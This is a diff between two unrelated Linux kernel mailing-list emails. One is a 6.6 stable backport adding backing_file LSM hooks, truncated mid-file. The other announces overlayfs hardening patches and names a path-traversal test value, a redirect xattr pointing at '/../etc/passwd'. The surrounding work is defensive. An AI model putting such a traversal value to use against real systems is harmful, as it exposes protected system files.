@@ -1,576 +1,501 @@
-Received: from canpmsgout04.his.huawei.com (canpmsgout04.his.huawei.com [113.46.200.219])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-ed1-f45.google.com (mail-ed1-f45.google.com [209.85.208.45])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B4A8E337BAC;
-	Mon, 22 Jun 2026 02:47:46 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=113.46.200.219
-ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1782096469; cv=none; b=KrxFHxcfy4mEmNsPAar7ac7oTiIDjYuYh/ikGkf/MS3x5v1yovUYj965Ig4w3PYgALzkLUk1KRz82amgwggAODBaRlNCpsuxrOIAOsZlEudVVsUqQ1iCPKFVh6xNKN+p71+ZzTGs6YSl2laCIh2FpxQIzGkOXLP0+RiOJl0TOoQ=
-ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1782096469; c=relaxed/simple;
-	bh=SB+iBgwA3BMJgx21o/68HcJ6RB9EwhoJ+7eQjKcxDDw=;
-	h=From:To:CC:Subject:Date:Message-ID:In-Reply-To:References:
-	 MIME-Version:Content-Type; b=ds3h1cLuaZM3LKBOF4u5wI33H71xTwUA6yiBR/EvTnm0SZQ+8M1lT27K6lM15MT6bUHoDCa7foosEfn4EqZro4AfDGoRIAU509K6Fu7BC34GSQYdzwLTE2anhzLRme1wB2IQbsoXDk0gWB40dlujFIDA2ZrH3yGSFSLVr3/J+S8=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=huawei.com; spf=pass smtp.mailfrom=huawei.com; dkim=pass (1024-bit key) header.d=huawei.com header.i=@huawei.com header.b=0vdKwf+N; arc=none smtp.client-ip=113.46.200.219
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=huawei.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=huawei.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 1384830C172
+	for <linux-unionfs@vger.kernel.org>; Mon, 22 Jun 2026 15:21:43 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.208.45
+ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1782141705; cv=pass; b=Xkx0YRl0YDLslUhfwBZej0nA32sYcgxXXJBCg9hiGqlBfJEinJBGPPk3yxO0CCSNj0RtURMpad1bIqbbnye86vY/UJ/6cGzASRLSRdsnFE/n+PvibFNCEfnkIjgfWzU/sB/hsE9ZMK4NNfqi0WpghIPFojGyTK5jo3JCErKgRSU=
+ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1782141705; c=relaxed/simple;
+	bh=TqAMygWECWrxOvnlC4El3EPebZuVRFB+jhRYEV6zNFc=;
+	h=MIME-Version:From:Date:Message-ID:Subject:To:Cc:Content-Type; b=HjVsCj4UW7GwLUusJpGll8dYvlZxJx9mwmIjRg2InSHklaU+Sp2c1ag7XKvap2jTN76xXfFyrGYUUY3x/AWm7GeGx7McEd7epxwtMXOPIJbg4RlqEl9Neo3zxggARbVxUDsIuyLeZ8YPWJFgvh5nWKNHoQieD+G8kgC/Qq8b3Mo=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=ewfpqUwG; arc=pass smtp.client-ip=209.85.208.45
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=huawei.com header.i=@huawei.com header.b="0vdKwf+N"
-dkim-signature: v=1; a=rsa-sha256; d=huawei.com; s=dkim;
-	c=relaxed/relaxed; q=dns/txt;
-	h=From;
-	bh=DLJ0oCfFp8ckzGYXXvEMXFpvGyRaR/xoG353ZKW9Tn0=;
-	b=0vdKwf+NT/26eTPB8a5zEium0S67PVv3kLh6xlI5KjUygfs1riilaEPIakk1agqS3ACAScWRd
-	6x3joQ5z21oaL5otwVfp8C59oj7lfhFXAFj3JaM3oOeufV+fDX4y3cD28QT+bRuuivciNqwAg11
-	VvC309mPqFfL49YM0+XQ0/c=
-Received: from mail.maildlp.com (unknown [172.19.162.140])
-	by canpmsgout04.his.huawei.com (SkyGuard) with ESMTPS id 4gkC8Q3FsPz1prLJ;
-	Mon, 22 Jun 2026 10:39:34 +0800 (CST)
-Received: from dggemv706-chm.china.huawei.com (unknown [10.3.19.33])
-	by mail.maildlp.com (Postfix) with ESMTPS id A789520226;
-	Mon, 22 Jun 2026 10:47:38 +0800 (CST)
-Received: from kwepemq200017.china.huawei.com (7.202.195.228) by
- dggemv706-chm.china.huawei.com (10.3.19.33) with Microsoft SMTP Server
- (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
- 15.2.1544.11; Mon, 22 Jun 2026 10:47:38 +0800
-Received: from octopus.huawei.com (10.67.174.191) by
- kwepemq200017.china.huawei.com (7.202.195.228) with Microsoft SMTP Server
- (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
- 15.2.1544.11; Mon, 22 Jun 2026 10:47:37 +0800
-From: Cai Xinchen <caixinchen1@huawei.com>
-To: <viro@zeniv.linux.org.uk>, <brauner@kernel.org>, <jack@suse.cz>,
-	<miklos@szeredi.hu>, <amir73il@gmail.com>, <paul@paul-moore.com>,
-	<jmorris@namei.org>, <serge@hallyn.com>, <stephen.smalley.work@gmail.com>,
-	<omosnace@redhat.com>, <gregkh@linuxfoundation.org>,
-	<bboscaccy@linux.microsoft.com>
-CC: <linux-fsdevel@vger.kernel.org>, <linux-kernel@vger.kernel.org>,
-	<linux-unionfs@vger.kernel.org>, <linux-security-module@vger.kernel.org>,
-	<selinux@vger.kernel.org>, <bpf@vger.kernel.org>, <lujialin4@huawei.com>
-Subject: [stable/linux-6.6.y 2/3] lsm: add backing_file LSM hooks
-Date: Mon, 22 Jun 2026 11:15:55 +0800
-Message-ID: <20260622031556.2664089-3-caixinchen1@huawei.com>
-X-Mailer: git-send-email 2.18.0.huawei.25
-In-Reply-To: <20260622031556.2664089-1-caixinchen1@huawei.com>
-References: <20260622031556.2664089-1-caixinchen1@huawei.com>
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="ewfpqUwG"
+Received: by mail-ed1-f45.google.com with SMTP id 4fb4d7f45d1cf-6978f1eeb87so2746676a12.0
+        for <linux-unionfs@vger.kernel.org>; Mon, 22 Jun 2026 08:21:42 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1782141701; cv=none;
+        d=google.com; s=arc-20240605;
+        b=JeU+4cAWu2M7q78dowHkrmmkCEZV3Qssj+/StUkBuj/V4OZ2awc+UxKx3b69LcyIdw
+         R4BpexlnjyYr8dfAebb9OA1ZONvfu1p8QtZSEXKiACrcQA7wlUcJKF/QLQNEPHu2nnQ5
+         gU58D0gPWgmg1QCuWfDw9cIC9QXB+g0rlYVFdQepYtNrlkBEZNJgpFETa12RNmBh7r43
+         Xo7QIZQ+sJhDNy6PQUWiX7Ug8LIyWYONd6sebGyFGBvsG/QUWrbHLeTl1GJ/B7p9N2fa
+         4pGtHUu2JaToqGgRKa9/9zFc+MYxjSIb79lMbfgrQpDKKQcPoPGt1CM863dLxNw/fjPy
+         PPBw==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
+        h=cc:to:subject:message-id:date:from:mime-version:dkim-signature;
+        bh=QlQi0xyaGxa3ALYxPJU0MWAqvO4Be5wuEfky1OiK+gc=;
+        fh=Yec64Yag0p28ojlMpsBawgcoLJsbyTFUUvVZOOpzkpU=;
+        b=gQXTrNh3KyeJJaCnUxk7M5Xf07Lf6GvtdKlwgYFTay9Yhyvj+fYTHY+BJJl77iBKfx
+         YiItslMRNS5REPFq49fgZr5rsZG93k+hHBtCo7FIVWUjwFu/IEEjXhYW1eKubluffDXQ
+         MmjcVdPlcShF45WL9hnKD+beztnttj0o94LKkvVqs8itxwyEoe9YDA2I++W37kAVnSDP
+         RHFWUDY2MfcxF+qhyH79G6n0DHBTYEZ87tZ/6fxxqDRodV8eCUusVQrLUyfjpbvpr2p2
+         aMQQzzNa8CgYmQ7VnZRognfcB3rsD2ylWa44IbOjBnhsyasiwMGsttG8DMrYVRmk3wwg
+         im6w==;
+        darn=vger.kernel.org
+ARC-Authentication-Results: i=1; mx.google.com; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20251104; t=1782141701; x=1782746501; darn=vger.kernel.org;
+        h=cc:to:subject:message-id:date:from:mime-version:from:to:cc:subject
+         :date:message-id:reply-to;
+        bh=QlQi0xyaGxa3ALYxPJU0MWAqvO4Be5wuEfky1OiK+gc=;
+        b=ewfpqUwGX6zB8BMZG4Hav0lWt2xOrzO3rien8cxyuHWXbNYrKG7IByuUQ3BgvVGAtn
+         0M24aOgFX3Mx0iiefVasq+FNQbZ2ipkuczMf+9EO/TUWJBc7gEVkpNH745axBBVrrAIX
+         Vf40cLiV6I+0xukVHbHkdkutELPX65shlnV1eSrDYdEqO9CiCyabWMFoVrMSw3kDw5+o
+         RdGR+k5fQ2P7p08Z8qd7Ph3Z9g6HmzYUAlZRZgpydqZc6x8CZDzgIyySDk/3j9lp8ZdT
+         aLGxO9AWlNLJ2WSsJoXLW1Qpv2IzA7XTNDYT5CH1kjbu6/LunYoh50usfb/OKvGPa0w4
+         5lHg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1782141701; x=1782746501;
+        h=cc:to:subject:message-id:date:from:mime-version:x-gm-gg
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
+        bh=QlQi0xyaGxa3ALYxPJU0MWAqvO4Be5wuEfky1OiK+gc=;
+        b=g7gxJ87OE16a+waI2FVW7ve+UdZ9VtIXRk18oRSSi1rNYRMwakOXn44+BucOYc5L5T
+         rnZaAajuM2UhbL2JCuBQh2SV644GjiGUlOdvIAZlOsz+2dSCRUsU9v2YS5K+a++Mm7XC
+         f0IXKr3TZh2FT3lasVC34K1yj/wXMXdQDKDiPZbt2mimQBdyrHlIW2DNgttb8OAq09s6
+         dDKJRsuA8Dy5AypShUFTIFRHkFknrnmaCRZdhZ4JoNXFlFfgVBs6L0WqCpmwIfmXl+ne
+         R6LI75/cReQVp9+s22aReO+r2+jGRxZ+isNVCiSGYVO4RKPWw5aUbT0PBmIVPPeEiUYm
+         4olw==
+X-Forwarded-Encrypted: i=1; AFNElJ926kYkNhWwYfoN94n5Egm5ukeUr+4geMP9elKAUYw3Clu8QxeGd9kCqWn56gwTfJiPFhImpt3i6fSuG6TF@vger.kernel.org
+X-Gm-Message-State: AOJu0YxGfsK4RDNs/n3bx7ouTBlwrYP9rqrhiG1Z333mp8Ttkimn7TQW
+	GdzippUHr3ps9UTB+vyBKRb7SMEJR4a4NGedVDD+l5XolXeD+cbwmCKh5IPsaK7pGbV5h+630Af
+	ua/vad1MX7jDi51EQVNizQsDqXxJv3ojMsrx2yTw=
+X-Gm-Gg: AfdE7clSV6ZCvb8uBSf7nuyO+KU2W5aEbXe63ZNmFI/nEcd7N42yd1QImqT0hXQZtka
+	BVbvozCbqohI+tXwHT0fZsiVEOzmh+JPZU5mVuizDpTEtIJQGB7OpqSNWNICHrP/HNbAyLNEshS
+	boDcjsbxxi2iMBmOSbJZwhYWOpsEB+yCwhYtFvGAn6NrxfDwq2AcbKBQBZVubNndu9ZwXcnTuoW
+	oW8Xt2FuLFBSTmLKRWftgCL42HPtn3ILaaUQzLODMs7SKToHcOS8L0gcVuMJrNtcLDjGhfng5c=
+X-Received: by 2002:a05:6402:5186:b0:697:bd9c:589c with SMTP id
+ 4fb4d7f45d1cf-697bd9c58f0mr1745635a12.7.1782141701318; Mon, 22 Jun 2026
+ 08:21:41 -0700 (PDT)
 Precedence: bulk
 X-Mailing-List: linux-unionfs@vger.kernel.org
 List-Id: <linux-unionfs.vger.kernel.org>
 List-Subscribe: <mailto:linux-unionfs+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-unionfs+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain
-X-ClientProxiedBy: kwepems100001.china.huawei.com (7.221.188.238) To
- kwepemq200017.china.huawei.com (7.202.195.228)
+From: "Rodrigo H." <gatofladigo1@gmail.com>
+Date: Mon, 22 Jun 2026 12:21:28 -0300
+X-Gm-Features: AVVi8Cf6RSD0sUC3JChyhTvK3V5NRpNBIqlMezpqXNo58YsiFL_4oiM2v_HCIEE
+Message-ID: <CAEAeJizPbZh=bcZk=iDhdw-LS-_ZG7V6SmvMprxVxS+m6BevGw@mail.gmail.com>
+Subject: [PATCH v3 0/3] overlayfs: security hardening patches (with PoCs)
+To: security@kernel.org, Greg KH <gregkh@linuxfoundation.org>
+Cc: miklos@szeredi.hu, amir73il@gmail.com, linux-unionfs@vger.kernel.org
+Content-Type: multipart/mixed; boundary="0000000000000ca15c0654d933c5"
 
-From: Paul Moore <paul@paul-moore.com>
+--0000000000000ca15c0654d933c5
+Content-Type: multipart/alternative; boundary="0000000000000ca15b0654d933c3"
 
-1. Mainline uses call_int_hook(FUNC, ...) with the default IRC baked
-into the macro. Linux 6.6.y uses call_int_hook(FUNC, IRC, ...) requiring
-an explicit default return value.
+--0000000000000ca15b0654d933c3
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 
-2. fs/backing-file.c does not exist in LTS
-Linux 6.6.y places backing_file_open() in fs/open.c and lacks a
-dedicated fs/backing-file.c.  The backing_file_mmap() function and
-scoped_with_creds() do not exist in 6.6.y.  Therefore the LTS patch calls
-security_mmap_backing_file() directly in ovl_mmap() in
-fs/overlayfs/file.c rather than modifying backing_file_mmap().
+Greg,
 
-3. Missing filesystems/modules
-Linux 6.6.y does not have backing_tmpfile_open(), fs/fuse/passthrough.c,
-or the erofs ishare mmap path that the mainline patch touches.  These hunks
-are dropped in the 6.6 LTS backport.
+Thank you for the previous review. I've now properly prepared the
+patches following the kernel submission process.
 
-Original commit message:
+Summary of changes:
 
-Stacked filesystems such as overlayfs do not currently provide the
-necessary mechanisms for LSMs to properly enforce access controls on the
-mmap() and mprotect() operations.  In order to resolve this gap, a LSM
-security blob is being added to the backing_file struct and the following
-new LSM hooks are being created:
+| Patch | Description | Reference |
+|-------|-------------|-----------|
+| 1/3 | Replace component walk in ovl_lookup_layer() with vfs_path_lookup()
+using LOOKUP_BENEATH | Matches ovl_lookup_data_layer() at namei.c:403-404 |
+| 2/3 | Convert long refcount =E2=86=92 refcount_t; add refcount_inc_not_ze=
+ro() in
+ovl_cache_get() | Per Amir's March 2024 question |
+| 3/3 | Add ovl_dir_cache_drop() helper with refcount_read() guard | Based
+on Nirmoy Das's RFC |
 
- security_backing_file_alloc()
- security_backing_file_free()
- security_mmap_backing_file()
+Testing:
 
-The first two hooks are to manage the lifecycle of the LSM security blob
-in the backing_file struct, while the third provides a new mmap() access
-control point for the underlying backing file.  It is also expected that
-LSMs will likely want to update their security_file_mprotect() callback
-to address issues with their mprotect() controls, but that does not
-require a change to the security_file_mprotect() LSM hook.
+- PoC #1 (poc1_path_traversal.sh): Confirms that `trusted.overlay.redirect`
+  with `/../etc/passwd` is blocked after PATCH 1
+- PoC #2 (poc2_refcount_race.c): 8 readdir + 8 open/close threads for 15s;
+  monitors dmesg for refcount_t warnings
 
-There are a three other small changes to support these new LSM hooks:
-* Pass the user file associated with a backing file down to
-alloc_empty_backing_file() so it can be included in the
-security_backing_file_alloc() hook.
-* Add getter and setter functions for the backing_file struct LSM blob
-as the backing_file struct remains private to fs/file_table.c.
-* Constify the file struct field in the LSM common_audit_data struct to
-better support LSMs that need to pass a const file struct pointer into
-the common LSM audit code.
+Important note on PATCH 2/3:
 
-Thanks to Arnd Bergmann for identifying the missing EXPORT_SYMBOL_GPL()
-and supplying a fixup.
+After re-analysis of the current code, both ovl_cache_get() (readdir.c:482)
+and ovl_cache_put() (readdir.c:295) execute under inode_lock exclusive
+(via WRAP_DIR_ITER and ovl_dir_release()). The long refcount is not
+currently subject to a race condition.
 
-Cc: stable@vger.kernel.org
-Cc: linux-fsdevel@vger.kernel.org
-Cc: linux-unionfs@vger.kernel.org
-Cc: linux-erofs@lists.ozlabs.org
-Reviewed-by: Amir Goldstein <amir73il@gmail.com>
-Reviewed-by: Serge Hallyn <serge@hallyn.com>
-Reviewed-by: Christian Brauner <brauner@kernel.org>
-Signed-off-by: Paul Moore <paul@paul-moore.com>
-Signed-off-by: Cai Xinchen <caixinchen1@huawei.com>
+This conversion to refcount_t is defense-in-depth =E2=80=94 it's the correc=
+t
+kernel type for reference counters and provides saturation protection.
+
+The real fixes are PATCH 1 (path traversal) and PATCH 3 (impure cache
+UAF prevention). PATCH 2 is still valid as a hardening measure.
+
+All patches are based on: ef0c9f75a195 (Nirmoy Das's commit)
+Branch: ovl-fixes-v3
+
+Full PoC scripts are attached.
+
+Thank you for your patience and guidance,
+
+Rodrigo Henrique de Souza
 ---
- fs/file_table.c               |  27 +++++++--
- fs/internal.h                 |   3 +-
- fs/open.c                     |   7 ++-
- fs/overlayfs/file.c           |   8 ++-
- include/linux/fs.h            |  15 ++++-
- include/linux/lsm_audit.h     |   2 +-
- include/linux/lsm_hook_defs.h |   5 ++
- include/linux/lsm_hooks.h     |   1 +
- include/linux/security.h      |  22 +++++++
- security/security.c           | 110 ++++++++++++++++++++++++++++++++++
- 10 files changed, 189 insertions(+), 11 deletions(-)
 
-diff --git a/fs/file_table.c b/fs/file_table.c
-index b4c208a77153..6b535e9c6166 100644
---- a/fs/file_table.c
-+++ b/fs/file_table.c
-@@ -48,6 +48,9 @@ static struct percpu_counter nr_files __cacheline_aligned_in_smp;
- struct backing_file {
- 	struct file file;
- 	struct path real_path;
-+#ifdef CONFIG_SECURITY
-+	void *security;
-+#endif
- };
- 
- static inline struct backing_file *backing_file(struct file *f)
-@@ -72,8 +75,21 @@ static void file_free_rcu(struct rcu_head *head)
- 		kmem_cache_free(filp_cachep, f);
- }
- 
-+#ifdef CONFIG_SECURITY
-+void *backing_file_security(const struct file *f)
-+{
-+	return backing_file(f)->security;
-+}
-+
-+void backing_file_set_security(struct file *f, void *security)
-+{
-+	backing_file(f)->security = security;
-+}
-+#endif /* CONFIG_SECURITY */
-+
- static inline void backing_file_free(struct backing_file *ff)
- {
-+	security_backing_file_free(&ff->file);
- 	path_put(&ff->real_path);
- }
- 
-@@ -257,10 +273,12 @@ struct file *alloc_empty_file_noaccount(int flags, const struct cred *cred)
- 	return f;
- }
- 
--static int init_backing_file(struct backing_file *ff)
-+static int init_backing_file(struct backing_file *ff,
-+			     const struct file *user_file)
- {
- 	memset(&ff->real_path, 0, sizeof(ff->real_path));
--	return 0;
-+	backing_file_set_security(&ff->file, NULL);
-+	return security_backing_file_alloc(&ff->file, user_file);
- }
- 
- /*
-@@ -270,7 +288,8 @@ static int init_backing_file(struct backing_file *ff)
-  * This is only for kernel internal use, and the allocate file must not be
-  * installed into file tables or such.
-  */
--struct file *alloc_empty_backing_file(int flags, const struct cred *cred)
-+struct file *alloc_empty_backing_file(int flags, const struct cred *cred,
-+				      const struct file *user_file)
- {
- 	struct backing_file *ff;
- 	int error;
-@@ -287,7 +306,7 @@ struct file *alloc_empty_backing_file(int flags, const struct cred *cred)
- 
- 	/* The f_mode flags must be set before fput(). */
- 	ff->file.f_mode |= FMODE_BACKING | FMODE_NOACCOUNT;
--	error = init_backing_file(ff);
-+	error = init_backing_file(ff, user_file);
- 	if (unlikely(error)) {
- 		fput(&ff->file);
- 		return ERR_PTR(error);
-diff --git a/fs/internal.h b/fs/internal.h
-index d64ae03998cc..576026e1ce3a 100644
---- a/fs/internal.h
-+++ b/fs/internal.h
-@@ -93,7 +93,8 @@ extern void chroot_fs_refs(const struct path *, const struct path *);
-  */
- struct file *alloc_empty_file(int flags, const struct cred *cred);
- struct file *alloc_empty_file_noaccount(int flags, const struct cred *cred);
--struct file *alloc_empty_backing_file(int flags, const struct cred *cred);
-+struct file *alloc_empty_backing_file(int flags, const struct cred *cred,
-+				      const struct file *user_file);
- 
- static inline void put_file_access(struct file *file)
- {
-diff --git a/fs/open.c b/fs/open.c
-index b5ea1dcbfb22..5b164481d80b 100644
---- a/fs/open.c
-+++ b/fs/open.c
-@@ -1175,18 +1175,19 @@ EXPORT_SYMBOL_GPL(kernel_file_open);
-  * the backing inode on the underlying filesystem, which can be
-  * retrieved using backing_file_real_path().
-  */
--struct file *backing_file_open(const struct path *path, int flags,
-+struct file *backing_file_open(const struct file *user_file, int flags,
- 			       const struct path *real_path,
- 			       const struct cred *cred)
- {
-+	const struct path *user_path = &user_file->f_path;
- 	struct file *f;
- 	int error;
- 
--	f = alloc_empty_backing_file(flags, cred);
-+	f = alloc_empty_backing_file(flags, cred, user_file);
- 	if (IS_ERR(f))
- 		return f;
- 
--	f->f_path = *path;
-+	f->f_path = *user_path;
- 	path_get(real_path);
- 	*backing_file_real_path(f) = *real_path;
- 	error = do_dentry_open(f, d_inode(real_path->dentry), NULL);
-diff --git a/fs/overlayfs/file.c b/fs/overlayfs/file.c
-index 8be4dc050d1e..07f00cf91977 100644
---- a/fs/overlayfs/file.c
-+++ b/fs/overlayfs/file.c
-@@ -60,7 +60,7 @@ static struct file *ovl_open_realfile(const struct file *file,
- 		if (!inode_owner_or_capable(real_idmap, realinode))
- 			flags &= ~O_NOATIME;
- 
--		realfile = backing_file_open(&file->f_path, flags, realpath,
-+		realfile = backing_file_open(file, flags, realpath,
- 					     current_cred());
- 	}
- 	revert_creds(old_cred);
-@@ -527,6 +527,7 @@ static int ovl_fsync(struct file *file, loff_t start, loff_t end, int datasync)
- 
- static int ovl_mmap(struct file *file, struct vm_area_struct *vma)
- {
-+	struct file *user_file = vma->vm_file;
- 	struct file *realfile = file->private_data;
- 	const struct cred *old_cred;
- 	int ret;
-@@ -540,6 +541,11 @@ static int ovl_mmap(struct file *file, struct vm_area_struct *vma)
- 	vma_set_file(vma, realfile);
- 
- 	old_cred = ovl_override_creds(file_inode(file)->i_sb);
-+	ret = security_mmap_backing_file(vma, realfile, user_file);
-+	if (ret) {
-+		revert_creds(old_cred);
-+		return ret;
-+	}
- 	ret = call_mmap(vma->vm_file, vma);
- 	revert_creds(old_cred);
- 	ovl_file_accessed(file);
-diff --git a/include/linux/fs.h b/include/linux/fs.h
-index 4cdeeaedaa40..5a897ee50f29 100644
---- a/include/linux/fs.h
-+++ b/include/linux/fs.h
-@@ -2515,11 +2515,24 @@ struct file *dentry_open(const struct path *path, int flags,
- 			 const struct cred *creds);
- struct file *dentry_create(const struct path *path, int flags, umode_t mode,
- 			   const struct cred *cred);
--struct file *backing_file_open(const struct path *path, int flags,
-+struct file *backing_file_open(const struct file *user_file, int flags,
- 			       const struct path *real_path,
- 			       const struct cred *cred);
- struct path *backing_file_real_path(struct file *f);
- 
-+#ifdef CONFIG_SECURITY
-+void *backing_file_security(const struct file *f);
-+void backing_file_set_security(struct file *f, void *security);
-+#else
-+static inline void *backing_file_security(const struct file *f)
-+{
-+	return NULL;
-+}
-+static inline void backing_file_set_security(struct file *f, void *security)
-+{
-+}
-+#endif /* CONFIG_SECURITY */
-+
- /*
-  * file_real_path - get the path corresponding to f_inode
-  *
-diff --git a/include/linux/lsm_audit.h b/include/linux/lsm_audit.h
-index 97a8b21eb033..c0a2839253fa 100644
---- a/include/linux/lsm_audit.h
-+++ b/include/linux/lsm_audit.h
-@@ -93,7 +93,7 @@ struct common_audit_data {
- #endif
- 		char *kmod_name;
- 		struct lsm_ioctlop_audit *op;
--		struct file *file;
-+		const struct file *file;
- 		struct lsm_ibpkey_audit *ibpkey;
- 		struct lsm_ibendport_audit *ibendport;
- 		int reason;
-diff --git a/include/linux/lsm_hook_defs.h b/include/linux/lsm_hook_defs.h
-index 2923754c13bc..567d7f16609c 100644
---- a/include/linux/lsm_hook_defs.h
-+++ b/include/linux/lsm_hook_defs.h
-@@ -169,6 +169,9 @@ LSM_HOOK(int, 0, kernfs_init_security, struct kernfs_node *kn_dir,
- LSM_HOOK(int, 0, file_permission, struct file *file, int mask)
- LSM_HOOK(int, 0, file_alloc_security, struct file *file)
- LSM_HOOK(void, LSM_RET_VOID, file_free_security, struct file *file)
-+LSM_HOOK(int, 0, backing_file_alloc, struct file *backing_file,
-+	 const struct file *user_file)
-+LSM_HOOK(void, LSM_RET_VOID, backing_file_free, struct file *backing_file)
- LSM_HOOK(int, 0, file_ioctl, struct file *file, unsigned int cmd,
- 	 unsigned long arg)
- LSM_HOOK(int, 0, file_ioctl_compat, struct file *file, unsigned int cmd,
-@@ -176,6 +179,8 @@ LSM_HOOK(int, 0, file_ioctl_compat, struct file *file, unsigned int cmd,
- LSM_HOOK(int, 0, mmap_addr, unsigned long addr)
- LSM_HOOK(int, 0, mmap_file, struct file *file, unsigned long reqprot,
- 	 unsigned long prot, unsigned long flags)
-+LSM_HOOK(int, 0, mmap_backing_file, struct vm_area_struct *vma,
-+	 struct file *backing_file, struct file *user_file)
- LSM_HOOK(int, 0, file_mprotect, struct vm_area_struct *vma,
- 	 unsigned long reqprot, unsigned long prot)
- LSM_HOOK(int, 0, file_lock, struct file *file, unsigned int cmd)
-diff --git a/include/linux/lsm_hooks.h b/include/linux/lsm_hooks.h
-index dcb5e5b5eb13..e8a881bf2a1a 100644
---- a/include/linux/lsm_hooks.h
-+++ b/include/linux/lsm_hooks.h
-@@ -59,6 +59,7 @@ struct security_hook_list {
- struct lsm_blob_sizes {
- 	int	lbs_cred;
- 	int	lbs_file;
-+	unsigned int lbs_backing_file;
- 	int	lbs_inode;
- 	int	lbs_superblock;
- 	int	lbs_ipc;
-diff --git a/include/linux/security.h b/include/linux/security.h
-index 937840870d86..4866ffdb4e6c 100644
---- a/include/linux/security.h
-+++ b/include/linux/security.h
-@@ -389,11 +389,17 @@ int security_kernfs_init_security(struct kernfs_node *kn_dir,
- int security_file_permission(struct file *file, int mask);
- int security_file_alloc(struct file *file);
- void security_file_free(struct file *file);
-+int security_backing_file_alloc(struct file *backing_file,
-+				const struct file *user_file);
-+void security_backing_file_free(struct file *backing_file);
- int security_file_ioctl(struct file *file, unsigned int cmd, unsigned long arg);
- int security_file_ioctl_compat(struct file *file, unsigned int cmd,
- 			       unsigned long arg);
- int security_mmap_file(struct file *file, unsigned long prot,
- 			unsigned long flags);
-+int security_mmap_backing_file(struct vm_area_struct *vma,
-+			       struct file *backing_file,
-+			       struct file *user_file);
- int security_mmap_addr(unsigned long addr);
- int security_file_mprotect(struct vm_area_struct *vma, unsigned long reqprot,
- 			   unsigned long prot);
-@@ -984,6 +990,15 @@ static inline int security_file_alloc(struct file *file)
- static inline void security_file_free(struct file *file)
- { }
- 
-+static inline int security_backing_file_alloc(struct file *backing_file,
-+					      const struct file *user_file)
-+{
-+	return 0;
-+}
-+
-+static inline void security_backing_file_free(struct file *backing_file)
-+{ }
-+
- static inline int security_file_ioctl(struct file *file, unsigned int cmd,
- 				      unsigned long arg)
- {
-@@ -1003,6 +1018,13 @@ static inline int security_mmap_file(struct file *file, unsigned long prot,
- 	return 0;
- }
- 
-+static inline int security_mmap_backing_file(struct vm_area_struct *vma,
-+					     struct file *backing_file,
-+					     struct file *user_file)
-+{
-+	return 0;
-+}
-+
- static inline int security_mmap_addr(unsigned long addr)
- {
- 	return cap_mmap_addr(addr);
-diff --git a/security/security.c b/security/security.c
-index 1794860fd614..e77f5c948190 100644
---- a/security/security.c
-+++ b/security/security.c
-@@ -78,6 +78,7 @@ struct security_hook_heads security_hook_heads __ro_after_init;
- static BLOCKING_NOTIFIER_HEAD(blocking_lsm_notifier_chain);
- 
- static struct kmem_cache *lsm_file_cache;
-+struct kmem_cache *lsm_backing_file_cache;
- static struct kmem_cache *lsm_inode_cache;
- 
- char *lsm_names;
-@@ -200,6 +201,8 @@ static void __init lsm_set_blob_sizes(struct lsm_blob_sizes *needed)
- 
- 	lsm_set_blob_size(&needed->lbs_cred, &blob_sizes.lbs_cred);
- 	lsm_set_blob_size(&needed->lbs_file, &blob_sizes.lbs_file);
-+	lsm_set_blob_size(&needed->lbs_backing_file,
-+			     &blob_sizes.lbs_backing_file);
- 	/*
- 	 * The inode blob gets an rcu_head in addition to
- 	 * what the modules might need.
-@@ -374,6 +377,7 @@ static void __init ordered_lsm_init(void)
- 
- 	init_debug("cred blob size       = %d\n", blob_sizes.lbs_cred);
- 	init_debug("file blob size       = %d\n", blob_sizes.lbs_file);
-+	init_debug("backing_file blob size  = %d\n", blob_sizes.lbs_backing_file);
- 	init_debug("inode blob size      = %d\n", blob_sizes.lbs_inode);
- 	init_debug("ipc blob size        = %d\n", blob_sizes.lbs_ipc);
- 	init_debug("msg_msg blob size    = %d\n", blob_sizes.lbs_msg_msg);
-@@ -388,6 +392,11 @@ static void __init ordered_lsm_init(void)
- 		lsm_file_cache = kmem_cache_create("lsm_file_cache",
- 						   blob_sizes.lbs_file, 0,
